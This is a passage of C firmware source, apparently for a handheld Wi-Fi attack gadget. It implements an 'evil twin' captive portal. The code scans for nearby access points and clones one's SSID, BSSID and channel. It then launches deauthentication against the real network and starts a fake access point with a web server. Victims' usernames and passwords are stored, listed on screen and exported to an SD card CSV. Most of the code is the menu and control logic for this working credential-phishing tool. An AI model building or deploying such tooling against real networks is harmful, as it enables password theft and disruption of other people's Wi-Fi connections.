  nv_write("portal", "ssid", CaptivePortal_custom_ssid,
           sizeof(CaptivePortal_custom_ssid));
  if (CaptivePortal_attackActive) {
    network_stop_ap(true);
    network_start_ap(CaptivePortal_custom_ssid, CaptivePortal_password,
                     CaptivePortal_ap_channel);
  }
}

void CaptivePortal_deleteCredential(int index) {
  int count = nv_count("portal");
  if (index < 0 || index >= count) {
    printf("Invalid credential index: %d\n", index);
    return;
  }

  for (int i = index; i < count - 1; i++) {
    CaptivePortal_Credential cred = CaptivePortal_Credential_INITIALIZER;
    NV_GET("portal", (nv_key("cred", i + 1)).data, cred);
    NV_PUT("portal", (nv_key("cred", i)).data, cred);
  }

  count--;
  NV_PUT("portal", "count", count);
  printf("Credential deleted at index %d\n", index);
  printf("New credential count: %d\n", count);
}

void CaptivePortal_clearAllCredentials(void) {
  NV_PUT("portal", "count", 0);
  for (int i = 0; i < MAX_CREDS; ++i)
    nv_erase("portal", (nv_key("cred", i)).data);
}

static void CaptivePortal_cpDrawCloneFrame(const char* title,
                                           const char* subtitle) {
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  wifiClearBody(TFT_BLACK);
  display_set_text_size(&(tft), 1);
  const int headerY = CaptivePortal_cpCloneHeaderY();
  display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), 8, headerY);
  display_print_line_cstr(&(tft), (TEXT(title)).data);
  if (subtitle && subtitle[0]) {
    display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
    display_set_cursor(&(tft), 8, headerY + 12);
    display_print_line_cstr(&(tft), (TEXT(subtitle)).data);
  }
}

static void CaptivePortal_cpCloneResetListRenderState(void) {
  CaptivePortal_s_cloneLastRenderedPage = -1;
  CaptivePortal_s_cloneLastRenderedSel = -1;
  CaptivePortal_s_cloneLastPrevEn = false;
  CaptivePortal_s_cloneLastNextEn = false;
}

static void CaptivePortal_cpCloneDrawListHeader(int count, int page,
                                                int totalPages) {
  const int headerY = CaptivePortal_cpCloneHeaderY();
  display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), 8, headerY);
  display_print(&(tft), "Clone Access Point");
  display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
  display_set_cursor(&(tft), 8, headerY + 12);
  display_printf(&(tft), "Found %d network%s", count, count == 1 ? "" : "s");
  display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), 170, headerY);
  display_printf(&(tft), "%d/%d", page + 1, totalPages);
}

static void CaptivePortal_cpCloneDrawListHint(void) {
  display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), 8,
                     wifiListBottomY() - CaptivePortal_CP_CLONE_HINT_H);
  display_print(&(tft), "Tap row or Pick to clone");
}

static void CaptivePortal_cpCloneDrawRow(int displayNum, text_t ssid, int rssi,
                                         int ch, uint8_t auth, int y,
                                         bool selected) {
  char ssidBuf[16];
  if (strlen((ssid).data) == 0) {
    strncpy(ssidBuf, "<hidden>", sizeof(ssidBuf));
  } else {
    strncpy(ssidBuf, (ssid).data, 11);
    ssidBuf[11] = '\0';
    if (strlen((ssid).data) > 11) {
      strcat(ssidBuf, "...");
    }
  }

  const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
  char buf[64];
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", displayNum,
           ssidBuf, rssi, ch, enc);

  display_fill_rect(&(tft), 0, y, display_width(&(tft)),
                    CaptivePortal_CP_CLONE_ROW_H, TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
  display_set_text_color_2(&(tft), selected ? FEATURE_TEXT : FEATURE_BG,
                           TFT_BLACK);
  display_print(&(tft), (TEXT(selected ? ">" : " ")).data);
  display_set_cursor(&(tft), 10, y);
  const bool openNet = (auth == WIFI_AUTH_OPEN);
  display_set_text_color_2(
      &(tft), selected ? FEATURE_TEXT : (openNet ? FEATURE_TEXT : WHITE),
      TFT_BLACK);
  display_print_line_cstr(&(tft), (TEXT(buf)).data);
}

static void CaptivePortal_cpCloneDrawRowAt(int rowIdx, int sortedIdx,
                                           const int* idx, int y,
                                           bool selected) {
  const int real = idx[sortedIdx];
  CaptivePortal_cpCloneDrawRow(rowIdx + 1, network_ssid(real),
                               network_rssi(real), network_channel(real),
                               network_auth_mode(real), y, selected);
}

static void CaptivePortal_cpCloneDrawNetworkList(int count, const int* idx,
                                                 int selectedIdx,
                                                 bool forceFull) {
  const int rowsPerPage = CaptivePortal_cpCloneRowsPerPage();
  const int page = selectedIdx / rowsPerPage;
  const int totalPages = DIV_MAX(1, (count + rowsPerPage - 1) / rowsPerPage);
  const int start = page * rowsPerPage;
  const int end = DIV_MIN(start + rowsPerPage, count);
  const int firstRowY = CaptivePortal_cpCloneFirstRowY();

  const bool pageChanged = (page != CaptivePortal_s_cloneLastRenderedPage);
  const bool needFull =
      forceFull || pageChanged || CaptivePortal_s_cloneLastRenderedSel < 0;

  if (needFull) {
    display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
    wifiClearBody(TFT_BLACK);
    display_set_text_size(&(tft), 1);
    CaptivePortal_cpCloneDrawListHeader(count, page, totalPages);

    int y = firstRowY;
    for (int row = start;
         row < end && y + CaptivePortal_CP_CLONE_ROW_H <=
                          CaptivePortal_cpCloneListAreaBottom();
         row++) {
      CaptivePortal_cpCloneDrawRowAt(row, row, idx, y, row == selectedIdx);
      y += CaptivePortal_CP_CLONE_ROW_H;
    }
    CaptivePortal_cpCloneDrawListHint();
    CaptivePortal_s_cloneLastRenderedPage = page;
    CaptivePortal_s_cloneLastRenderedSel = selectedIdx;
    return;
  }

  if (CaptivePortal_s_cloneLastRenderedSel != selectedIdx) {
    const int prev = CaptivePortal_s_cloneLastRenderedSel;
    const int now = selectedIdx;

    if (prev >= start && prev < end) {
      const int y = firstRowY + (prev - start) * CaptivePortal_CP_CLONE_ROW_H;
      CaptivePortal_cpCloneDrawRowAt(prev, prev, idx, y, false);
    }
    if (now >= start && now < end) {
      const int y = firstRowY + (now - start) * CaptivePortal_CP_CLONE_ROW_H;
      CaptivePortal_cpCloneDrawRowAt(now, now, idx, y, true);
    }
    CaptivePortal_s_cloneLastRenderedSel = selectedIdx;
  }
}

static void CaptivePortal_cpCloneDrawScanning(void) {
  CaptivePortal_cpDrawCloneFrame("Scanning...", "Looking for nearby APs");
  loading(100, UI_WARN, 0, 0, 3, true);
}

static void CaptivePortal_cpCloneDrawEmpty(void) {
  CaptivePortal_cpDrawCloneFrame("No networks found",
                                 "Press Scan to retry or Back to cancel");
}

static void CaptivePortal_cpCloneEndUi(void) {
  CaptivePortal_s_cloneUiActive = false;
  CaptivePortal_s_clonePickMode = false;
  CaptivePortal_cpCloneResetListRenderState();
  CaptivePortal_cportalUpdateNavLabels();
}

static void CaptivePortal_cpCloneWaitNavRelease(void) {
  while (isButtonPressed(BTN_UP) || isButtonPressed(BTN_DOWN) ||
         isButtonPressed(BTN_RIGHT)) {
    sys_sleep_ms(10);
  }
  sys_sleep_ms(CaptivePortal_cportalDebounceMs);
}

static void CaptivePortal_cportalWaitButtonRelease(int pin) {
  while (isButtonPressed(pin)) {
    sys_sleep_ms(10);
  }
  sys_sleep_ms(CaptivePortal_cportalDebounceMs);
}

static CaptivePortal_CpCloneAction CaptivePortal_cpCloneWaitInput(
    bool prevEnabled, bool nextEnabled, bool pickMode, int* tx, int* ty) {
  (*tx) = (*ty) = -1;
  while (true) {
    if (feature_exit_requested || featureExitButtonPressed()) {
      feature_exit_requested = true;
      return CaptivePortal_CpCloneAction_Exit;
    }

    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
      display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
      if (isButtonPressedEdge(BTN_LEFT)) {
        return CaptivePortal_CpCloneAction_Back;
      }
      if (isButtonPressedEdge(BTN_DOWN)) {
        if (pickMode) {
          if (nextEnabled) {
            return CaptivePortal_CpCloneAction_Next;
          }
        } else {
          return CaptivePortal_CpCloneAction_Rescan;
        }
      }
      if (isButtonPressedEdge(BTN_UP) && prevEnabled) {
        return CaptivePortal_CpCloneAction_Prev;
      }
      if (isButtonPressedEdge(BTN_RIGHT) && pickMode) {
        return CaptivePortal_CpCloneAction_Pick;
      }
      if (readTouchXY(&((*tx)), &((*ty))) &&
          (*ty) >= CaptivePortal_cpCloneFirstRowY() &&
          (*ty) < CaptivePortal_cpCloneListAreaBottom()) {
        sys_sleep_ms(200);
        return CaptivePortal_CpCloneAction_ListTap;
      }
      sys_sleep_ms(20);
      continue;
    }

    if (!readTouchXY(&((*tx)), &((*ty)))) {
      sys_sleep_ms(10);
      continue;
    }
    sys_sleep_ms(200);

    const int footerY = display_height(&(tft)) - FeatureUI_FOOTER_H;
    if ((*ty) >= footerY) {
      if ((*tx) < 60) {
        return CaptivePortal_CpCloneAction_Back;
      }
      if ((*tx) < 120) {
        return pickMode ? CaptivePortal_CpCloneAction_Pick
                        : CaptivePortal_CpCloneAction_Rescan;
      }
      if ((*tx) < 180 && prevEnabled) {
        return CaptivePortal_CpCloneAction_Prev;
      }
      if ((*tx) >= 180 && nextEnabled) {
        return CaptivePortal_CpCloneAction_Next;
      }
      continue;
    }
    if ((*ty) >= CaptivePortal_cpCloneFirstRowY() &&
        (*ty) < CaptivePortal_cpCloneListAreaBottom()) {
      return CaptivePortal_CpCloneAction_ListTap;
    }
  }
}

static void CaptivePortal_cpDrawCloneFooter(bool prevEnabled, bool nextEnabled,
                                            bool pickMode) {
  CaptivePortal_s_clonePrevEn = prevEnabled;
  CaptivePortal_s_cloneNextEn = nextEnabled;
  CaptivePortal_s_clonePickMode = pickMode;
  if (featureHasTouchNavBar()) {
    setTouchNavLabels("Back", pickMode ? (nextEnabled ? "Next" : NULL) : "Scan",
                      "Exit", prevEnabled ? "Prev" : NULL,
                      pickMode ? "Pick" : NULL);
    redrawTouchButtonBar();
    return;
  }

  FeatureUI_drawFooterBg();

  FeatureUI_Button btns[4];

  FeatureUI_layoutFooter4(
      &(btns), "Back", FeatureUI_ButtonStyle_Secondary,
      pickMode ? "Pick" : "Scan", FeatureUI_ButtonStyle_Secondary, "Prev",
      FeatureUI_ButtonStyle_Secondary, "Next", FeatureUI_ButtonStyle_Secondary,
      false, false, !prevEnabled, !nextEnabled);

  for (int i = 0; i < 4; ++i) {
    FeatureUI_drawButtonRect(btns[i].x, btns[i].y, btns[i].w, btns[i].h,
                             btns[i].label, btns[i].style, false,
                             btns[i].disabled, 1);
  }
}

static bool CaptivePortal_cpCloneFillSelection(int sortedIdx, const int* idx,
                                               int count, text_t* outSsid,
                                               uint8_t* outChannel,
                                               uint8_t outBssid[6]) {
  if (sortedIdx < 0 || sortedIdx >= count) {
    return false;
  }
  const int real = idx[sortedIdx];
  (*outSsid) = network_ssid(real);
  (*outChannel) = (uint8_t)network_channel(real);
  memcpy(outBssid, network_bssid(real), 6);
  return true;
}

static bool CaptivePortal_cpCloneScanAndSelect(text_t* outSsid,
                                               uint8_t* outChannel,
                                               uint8_t outBssid[6]) {
  enum { MAX_RESULTS = 40 };

  CaptivePortal_s_cloneUiActive = true;
  CaptivePortal_cportalUpdateNavLabels();

  while (true) {
    CaptivePortal_cpCloneDrawScanning();

    network_clear_scan();
    network_set_mode(WIFI_MODE_STA);
    network_disconnect_options(false, false);
    sys_sleep_ms(50);
    const uint32_t dwell = wifiStaScanMsPerChannel();
    int n = network_scan(false, true, false, dwell);
    if (n <= 0) {
      CaptivePortal_cpCloneDrawEmpty();
      CaptivePortal_cpDrawCloneFooter(false, false, false);

      int tx = 0;
      int ty = 0;
      const CaptivePortal_CpCloneAction action =
          CaptivePortal_cpCloneWaitInput(false, false, false, &(tx), &(ty));
      if (action == CaptivePortal_CpCloneAction_Exit ||
          action == CaptivePortal_CpCloneAction_Back) {
        CaptivePortal_cpCloneEndUi();
        return false;
      }
      if (action == CaptivePortal_CpCloneAction_Rescan) {
        continue;
      }
      continue;
    }

    int count = DIV_MIN(n, MAX_RESULTS);
    int idx[MAX_RESULTS];
    for (int i = 0; i < count; i++) idx[i] = i;

    for (int i = 0; i < count - 1; i++) {
      int best = i;
      for (int j = i + 1; j < count; j++) {
        if (network_rssi(idx[j]) > network_rssi(idx[best])) best = j;
      }
      if (best != i) {
        int tmp = idx[i];
        idx[i] = idx[best];
        idx[best] = tmp;
      }
    }

    int selectedIdx = 0;
    CaptivePortal_cpCloneResetListRenderState();
    bool listFullRedraw = true;
    while (true) {
      const bool prevEnabled = selectedIdx > 0;
      const bool nextEnabled = selectedIdx < count - 1;
      CaptivePortal_cpCloneDrawNetworkList(count, idx, selectedIdx,
                                           listFullRedraw);
      if (listFullRedraw || prevEnabled != CaptivePortal_s_cloneLastPrevEn ||
          nextEnabled != CaptivePortal_s_cloneLastNextEn) {
        CaptivePortal_cpDrawCloneFooter(prevEnabled, nextEnabled, true);
        CaptivePortal_s_cloneLastPrevEn = prevEnabled;
        CaptivePortal_s_cloneLastNextEn = nextEnabled;
      }
      listFullRedraw = false;

      int tx = 0;
      int ty = 0;
      const CaptivePortal_CpCloneAction action = CaptivePortal_cpCloneWaitInput(
          prevEnabled, nextEnabled, true, &(tx), &(ty));
      if (action == CaptivePortal_CpCloneAction_Exit ||
          action == CaptivePortal_CpCloneAction_Back) {
        CaptivePortal_cpCloneEndUi();
        return false;
      }
      if (action == CaptivePortal_CpCloneAction_Pick) {
        if (CaptivePortal_cpCloneFillSelection(selectedIdx, idx, count,
                                               &((*outSsid)), &((*outChannel)),
                                               outBssid)) {
          CaptivePortal_cpCloneEndUi();
          return true;
        }
        continue;
      }
      if (action == CaptivePortal_CpCloneAction_Prev && prevEnabled) {
        selectedIdx--;
        CaptivePortal_cpCloneWaitNavRelease();
        continue;
      }
      if (action == CaptivePortal_CpCloneAction_Next && nextEnabled) {
        selectedIdx++;
        CaptivePortal_cpCloneWaitNavRelease();
        continue;
      }
      if (action == CaptivePortal_CpCloneAction_ListTap) {
        const int rowsPerPage = CaptivePortal_cpCloneRowsPerPage();
        const int page = selectedIdx / rowsPerPage;
        const int start = page * rowsPerPage;
        const int firstRowY = CaptivePortal_cpCloneFirstRowY();
        const int clickedOffset =
            (ty - firstRowY) / CaptivePortal_CP_CLONE_ROW_H;
        const int absoluteRow = start + clickedOffset;
        if (absoluteRow >= start &&
            absoluteRow < DIV_MIN(start + rowsPerPage, count)) {
          selectedIdx = absoluteRow;
          if (CaptivePortal_cpCloneFillSelection(selectedIdx, idx, count,
                                                 &((*outSsid)),
                                                 &((*outChannel)), outBssid)) {
            CaptivePortal_cpCloneEndUi();
            return true;
          }
        }
      }
    }
  }
}

static void CaptivePortal_cpCloneExistingAPFlow(void) {
  bool wasActive = CaptivePortal_attackActive;
  if (CaptivePortal_attackActive) CaptivePortal_stopAttack();

  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(true, false);
  sys_sleep_ms(100);

  text_t chosen = {0};
  uint8_t ch = 1;
  uint8_t bssid[6] = {0};
  bool ok = CaptivePortal_cpCloneScanAndSelect(&(chosen), &(ch), bssid);
  network_clear_scan();

  if (!ok) {
    if (wasActive) CaptivePortal_startAttack();
    CaptivePortal_drawMainMenu();
    return;
  }

  CaptivePortal_ap_channel = (ch == 0 ? 1 : ch);
  CaptivePortal_saveSSID(chosen);
  printf("[CP] Cloned AP: SSID='%s' CH=%u\n", CaptivePortal_custom_ssid,
         (unsigned)CaptivePortal_ap_channel);

  memset(&CaptivePortal_cp_target_ap, 0, sizeof(CaptivePortal_cp_target_ap));
  strcpy((char*)CaptivePortal_cp_target_ap.ssid, (chosen).data);
  memcpy(CaptivePortal_cp_target_ap.bssid, bssid, 6);
  CaptivePortal_cp_target_ap.primary = CaptivePortal_ap_channel;

  CaptivePortal_cpStartDeauth(chosen, bssid, CaptivePortal_ap_channel);

  sys_sleep_ms(500);

  CaptivePortal_startAttack();
  CaptivePortal_drawMainMenu();
}

static void CaptivePortal_cpEditSsid(void) {
  OnScreenKeyboardConfig cfg = OnScreenKeyboardConfig_INITIALIZER;
  cfg.titleLine1 = "[!] Set the SSID that your AP will use";
  cfg.titleLine2 = "to host the captive portal. ^ caps, # sym";
  osKeyboardUseStandardLayout(&(cfg));
  cfg.maxLen = 31;
  cfg.shuffleNames = CaptivePortal_seriesSSIDs;
  cfg.shuffleCount = CaptivePortal_numSeriesSSIDs;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.middleLabel = "Shuffle";
  cfg.okLabel = "OK";
  cfg.enableShuffle = true;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "SSID cannot be empty!";

  OnScreenKeyboardResult r =
      showOnScreenKeyboard(&(cfg), CaptivePortal_inputSSID);
  if (r.accepted && strlen((r.text).data) > 0) {
    CaptivePortal_inputSSID = r.text;
    CaptivePortal_saveSSID(CaptivePortal_inputSSID);
  }
  CaptivePortal_drawMainMenu();
}

void CaptivePortal_drawMainMenu(void) {
  CaptivePortal_currentScreen = CaptivePortal_MAIN_MENU;
  CaptivePortal_cportalUpdateNavLabels();

  display_set_text_size(&(tft), 1);
  wifiClearBody(TFT_BLACK);

  CaptivePortal_displayPrint(TEXT("Current SSID:"), UI_TEXT, false);
  CaptivePortal_displayPrint(TEXT(CaptivePortal_custom_ssid), WHITE, false);
  CaptivePortal_displayPrint(TEXT("..."), UI_TEXT, false);

  char channelLine[32];
  snprintf(channelLine, sizeof(channelLine), "Channel: %u",
           (unsigned)CaptivePortal_ap_channel);
  CaptivePortal_displayPrint(TEXT(channelLine), UI_TEXT, false);
  CaptivePortal_displayPrint(
      TEXT(CaptivePortal_attackActive ? "Status: Active" : "Status: Inactive"),
      UI_TEXT, false);
  if (CaptivePortal_cp_deauth_active) {
    char buf[32];
    snprintf(buf, sizeof(buf), "Evil Twin: %u pkts",
             (unsigned)CaptivePortal_cp_deauth_packet_count);
    CaptivePortal_displayPrint(TEXT(buf), UI_WARN, false);
  }
}

void CaptivePortal_drawCredList(void) {
  CaptivePortal_cportalUpdateNavLabels();
  wifiClearBody(TFT_BLACK);
  display_set_text_color_2(&(tft), UI_TEXT, TFT_BLACK);
  display_set_text_size(&(tft), 1);
  display_set_cursor(&(tft), 0, 50);
  display_print_line_cstr(&(tft), "Credentials List:");

  display_set_cursor(&(tft), 0, 70);
  display_print(&(tft), "User");
  display_set_cursor(&(tft), 80, 70);
  display_print(&(tft), "Pass");
  display_set_cursor(&(tft), 160, 70);
  display_print(&(tft), "SSID");
  display_draw_fast_h_line(&(tft), 0, 80, 245, UI_LINE);

  int count = nv_count("portal");
  printf("Reading %d credentials from NVS\n", count);

  int startIdx = CaptivePortal_credPage * CaptivePortal_kCredRowsPerPage;
  int yOffset = 90;

  if (count == 0) {
    display_set_cursor(&(tft), 0, yOffset);
    display_print_line_cstr(&(tft), "No credentials");
    div_console_line(TEXT("No credentials found"));
  } else {
    for (int i = startIdx;
         i < DIV_MIN(count, startIdx + CaptivePortal_kCredRowsPerPage); i++) {
      CaptivePortal_Credential cred = CaptivePortal_Credential_INITIALIZER;
      NV_GET("portal", (nv_key("cred", i)).data, cred);
      printf("Credential %d: SSID=%s\n", i, cred.ssid);

      display_set_text_color_2(&(tft), WHITE, TFT_BLACK);
      display_set_cursor(&(tft), 0, yOffset);
      display_print_line_cstr(&(tft), (TEXT(cred.username)).data);
      display_set_cursor(&(tft), 80, yOffset);
      display_print_line_cstr(&(tft), (TEXT(cred.password)).data);
      display_set_cursor(&(tft), 160, yOffset);
      display_print_line_cstr(&(tft), (TEXT(cred.ssid)).data);

      display_set_text_color_2(&(tft), UI_WARN, TFT_BLACK);
      display_set_cursor(&(tft), 223, yOffset - 1);
      display_print_line_cstr(&(tft), "X");

      yOffset += 10;
    }
  }

  if (!featureHasTouchNavBar()) {
    enum { buttonY = 290 };
    display_set_text_color_2(&(tft), FEATURE_TEXT, TFT_BLACK);
    display_set_text_size(&(tft), 1);
    display_set_text_datum(&(tft), MC_DATUM);

    display_fill_round_rect(&(tft), 5, buttonY, 50, 20, 8, DARK_GRAY);
    display_draw_round_rect(&(tft), 5, buttonY, 50, 20, 8, FEATURE_TEXT);
    display_draw_string(&(tft), "Back", 30, buttonY + 10, 0);

    display_fill_round_rect(&(tft), 65, buttonY, 50, 20, 8, DARK_GRAY);
    display_draw_round_rect(&(tft), 65, buttonY, 50, 20, 8, FEATURE_TEXT);
    display_draw_string(&(tft), "Clear", 90, buttonY + 10, 0);

    display_fill_round_rect(&(tft), 125, buttonY, 50, 20, 8, DARK_GRAY);
    display_draw_round_rect(&(tft), 125, buttonY, 50, 20, 8, FEATURE_TEXT);
    display_draw_string(&(tft), "Export", 150, buttonY + 10, 0);

    if (CaptivePortal_credPage > 0) {
      display_fill_round_rect(&(tft), 185, buttonY, 50, 20, 8, DARK_GRAY);
      display_draw_round_rect(&(tft), 185, buttonY, 50, 20, 8, FEATURE_TEXT);
      display_draw_string(&(tft), "Prev", 210, buttonY + 10, 0);
    } else if (count >
               (CaptivePortal_credPage + 1) * CaptivePortal_kCredRowsPerPage) {
      display_fill_round_rect(&(tft), 185, buttonY, 50, 20, 8, DARK_GRAY);
      display_draw_round_rect(&(tft), 185, buttonY, 50, 20, 8, FEATURE_TEXT);
      display_draw_string(&(tft), "Next", 210, buttonY + 10, 0);
    }
  }
}

void CaptivePortal_stopAttack(void) {
  if (CaptivePortal_attackActive) {
    network_stop_ap(true);
    div_console_line(TEXT("Access Point stopped"));
    CaptivePortal_displayPrint(TEXT("Access Point stopped"), GREEN, false);

    CaptivePortal_stopWebServer();
    div_console_line(TEXT("Web server stopped"));
    CaptivePortal_displayPrint(TEXT("Web server stopped"), GREEN, false);

    CaptivePortal_cpStopDeauth();

    CaptivePortal_attackActive = false;
    CaptivePortal_drawMainMenu();
  } else {
    div_console_line(TEXT("Attack already inactive"));
    CaptivePortal_displayPrint(TEXT("Attack already inactive"), GREEN, false);
  }
}

void CaptivePortal_startAttack(void) {
  if (!CaptivePortal_attackActive) {
    network_set_mode(WIFI_MODE_AP);
    network_start_ap(CaptivePortal_custom_ssid, CaptivePortal_password,
                     CaptivePortal_ap_channel);
    div_console_line(TEXT("Access Point started"));
    div_console_write(TEXT("IP Address: "));
    div_console_line(TEXT(network_ipv4(true)));
    CaptivePortal_displayPrint(TEXT("Access Point started"), GREEN, false);

    if (!CaptivePortal_setupWebServer()) {
      div_console_line(TEXT("Web server failed to start"));
      CaptivePortal_displayPrint(TEXT("Web server failed to start"), UI_WARN,
                                 false);
      return;
    }
    div_console_line(TEXT("Web server started"));
    CaptivePortal_displayPrint(TEXT("Web server started"), GREEN, false);

    CaptivePortal_attackActive = true;
    CaptivePortal_drawMainMenu();
  } else {
    div_console_line(TEXT("Attack already active"));
    CaptivePortal_displayPrint(TEXT("Attack already active"), GREEN, false);
  }
}

void CaptivePortal_handleMainMenu(int x, int y) {
  (void)x;
  (void)y;
}

void CaptivePortal_handleCredList(int x, int y) {
  int count = nv_count("portal");
  int startIdx = CaptivePortal_credPage * CaptivePortal_kCredRowsPerPage;
  int yOffset = 80;

  for (int i = startIdx;
       i < DIV_MIN(count, startIdx + CaptivePortal_kCredRowsPerPage); i++) {
    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
      printf("Delete button pressed for credential %d\n", i);
      CaptivePortal_deleteCredential(i);
      CaptivePortal_drawCredList();
      return;
    }
    yOffset += 10;
  }

  if (featureHasTouchNavBar()) {
    return;
  }

  enum { buttonY = 290 };

  if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
    div_console_line(TEXT("Back button pressed"));
    CaptivePortal_currentScreen = CaptivePortal_MAIN_MENU;
    CaptivePortal_drawMainMenu();
  }
  if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
    div_console_line(TEXT("Clear All button pressed"));
    CaptivePortal_clearAllCredentials();
    CaptivePortal_credPage = 0;
    CaptivePortal_drawCredList();
  }
  if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
    div_console_line(TEXT("Export button pressed"));
    int dumped = 0;
    if (CaptivePortal_cpDumpAllCredentialsToSD(&dumped)) {
      char status[96];
      snprintf(status, sizeof(status),
               "Exported %d -> SD:/captive_portal/eeprom_dump.csv", dumped);
      CaptivePortal_cpCredListStatus(TEXT(status), UI_OK);
    } else {
      CaptivePortal_cpCredListStatus(TEXT("Export failed: SD not ready"),
                                     UI_WARN);
    }
  }
  if (CaptivePortal_credPage > 0 && x >= 185 && x <= 235 && y >= buttonY &&
      y <= buttonY + 20) {
    div_console_line(TEXT("Prev button pressed"));
    CaptivePortal_credPage--;
    CaptivePortal_drawCredList();
  } else if (count > (CaptivePortal_credPage + 1) *
                         CaptivePortal_kCredRowsPerPage &&
             x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    div_console_line(TEXT("Next button pressed"));
    CaptivePortal_credPage++;
    CaptivePortal_drawCredList();
  }
}

static bool CaptivePortal_uiDrawn = false;

void CaptivePortal_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 6

  static int iconX[ICON_NUM] = {90, 130, 170, 210, 50, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
      bitmap_icon_dialog, bitmap_icon_list,  bitmap_icon_antenna,
      bitmap_icon_power,  bitmap_icon_wifi2, bitmap_icon_go_back};

  if (!CaptivePortal_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, UI_ICON);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    CaptivePortal_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, UI_ICON);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          CaptivePortal_cpEditSsid();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          CaptivePortal_currentScreen = CaptivePortal_CRED_LIST;
          CaptivePortal_credPage = 0;
          CaptivePortal_drawCredList();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          CaptivePortal_startAttack();
          animationState = 0;
          activeIcon = -1;
          break;
        case 3:
          CaptivePortal_stopAttack();
          animationState = 0;
          activeIcon = -1;
          break;

        case 4:
          CaptivePortal_cpCloneExistingAPFlow();
          animationState = 0;
          activeIcon = -1;
          break;

        case 5:
          feature_exit_requested = true;
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;

    case 4:
      break;
    case 5:
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (CaptivePortal_currentScreen == CaptivePortal_CRED_LIST) {
        CaptivePortal_handleCredList(x, y);
      } else {
        CaptivePortal_handleMainMenu(x, y);
      }

      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 5) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void CaptivePortal_cportalUpdateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (CaptivePortal_s_cloneUiActive) {
    setTouchNavLabels("Back",
                      CaptivePortal_s_clonePickMode
                          ? (CaptivePortal_s_cloneNextEn ? "Next" : NULL)
                          : "Scan",
                      "Exit", CaptivePortal_s_clonePrevEn ? "Prev" : NULL,
                      CaptivePortal_s_clonePickMode ? "Pick" : NULL);
  } else if (CaptivePortal_currentScreen == CaptivePortal_CRED_LIST) {
    const int count = nv_count("portal");
    const bool hasPrev = CaptivePortal_credPage > 0;
    const bool hasNext =
        count > (CaptivePortal_credPage + 1) * CaptivePortal_kCredRowsPerPage;
    setTouchNavLabels("Back", "Clear", "Exit", "Export",
                      hasNext ? "Next" : (hasPrev ? "Prev" : NULL));
  } else {
    setTouchNavLabels("SSID", "Creds", "Exit",
                      CaptivePortal_attackActive ? "Stop" : "Start", "Clone");
  }
  redrawTouchButtonBar();
}

static void CaptivePortal_cportalTeardown(void) {
  CaptivePortal_stopAttack();
